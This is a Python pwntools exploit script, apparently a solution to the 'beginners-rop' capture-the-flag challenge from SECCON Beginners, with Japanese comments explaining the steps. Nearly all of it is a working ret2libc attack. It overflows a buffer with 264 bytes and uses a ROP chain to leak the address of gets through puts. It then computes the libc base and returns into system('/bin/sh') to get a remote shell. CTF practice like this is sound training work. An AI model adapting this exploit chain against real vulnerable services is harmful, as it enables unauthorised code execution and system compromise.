#!/usr/bin/python3

from pwn import *


context.arch = 'amd64'
context.bits = 64
context.endian = 'little'


r = remote('beginners-rop.quals.beginners.seccon.jp', 4102)

binary = ELF('./chall')
libc = ELF('./libc-2.27.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #for local exploit

# get gadgets from target binary
binary_gadgets = ROP(binary)

# get a "pop rdi" 64bit binaryは引数をスタックではなくレジスタで渡すからpop rdiが必要。引数が2つならrsiも必要。

POP_RDI = (binary_gadgets.find_gadget(['pop rdi', 'ret']))[0]
#or ROPgadget --binary targetbinaryname | grep "pop rdi"
#ROPあるあるでrsp & 0xf = 0にならないとプログラムが落ちることがある。その回避策としてretだけするgadgetを挟むということがあるらしい。　
RET = (binary_gadgets.find_gadget(['ret']))[0]

#get puts address from binary
puts_plt = binary.plt['puts']
#puts_got = binary.got['puts']
#get gets address from binary
#gets_plt = binary.plt['gets']
gets_got = binary.got['gets']
#get main address from binary
main_plt = binary.symbols['main']

#leak -> main again
offset = 264 #264 segmentation fault
payload = b'A' * offset
payload += p64(POP_RDI)
payload += p64(gets_got)
payload += p64(puts_plt)
payload += p64(main_plt)
r.sendline(payload)

recieved = r.recv().strip()[-6:]
leak = u64(recieved.ljust(8,b'\x00'))
#log.info("leaked lib puts : %s", hex(leak)) 
log.info("leaked lib gets : %s", hex(leak)) 
#log.info("libc puts offset : %s", hex(libc.sym['puts']))
log.info("libc gets offset : %s", hex(libc.sym['gets']))
#libc.addressに値を入れることで、次回のsym()検索から絶対アドレスを検索できる
libc.address = leak - libc.sym['gets']
log.info("libc base address : %s", hex(libc.address))
#gdb.attach(p)
#ここまでの値はdebugの disass gets のアドレスとleakアドレスが一致してるので、正しいとおもいます。

#baseaddr = libc.address
#system_rel = 0x4f550 
#systemaddr = baseaddr - system_rel
#SYSTEM = systemaddr

SYSTEM = libc.sym["system"]
BINSH = next(libc.search(b"/bin/sh"))
log.info("system address : %s", hex(SYSTEM))
log.info("string of '/bin/sh' : %s", hex(BINSH))
#gdb.attach(r) #not work on remote.
#systemアドレスが disass system のアドレスと一致しない。なぜ？->exploitで指定した共有ライブラリが問題ライブラリがリンクしている共有ライブラリと違うバージョンだったから。。

#resend payload and get a shell
payload = b'A' * offset
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(BINSH)
payload += p64(SYSTEM)

r.sendline(payload)
r.interactive()
